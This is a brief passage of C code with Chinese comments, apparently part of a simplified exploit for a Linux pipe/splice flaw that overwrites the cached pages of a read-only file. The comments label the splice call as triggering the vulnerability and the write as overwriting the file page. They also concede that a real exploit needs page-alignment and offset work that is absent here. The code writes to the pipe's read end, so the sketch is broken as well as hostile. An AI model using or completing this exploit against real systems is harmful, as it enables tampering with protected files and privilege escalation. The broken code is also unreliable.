    int p2[2];
    pipe(p2);
    // 3. 使用 splice 将文件内容读入 pipe（触发漏洞）
    splice(fd2, NULL, p2[1], NULL, size, 0);
    close(p2[1]);
    // 4. 向 pipe 写入修改后的数据（覆盖文件页）
    write(p2[0], buf, size);  // 注意：这里实际利用需要更精细的控制
    // 实际公开利用代码使用更复杂的页对齐和偏移计算
    printf("Exploit attempted. Check file %s\n", file);
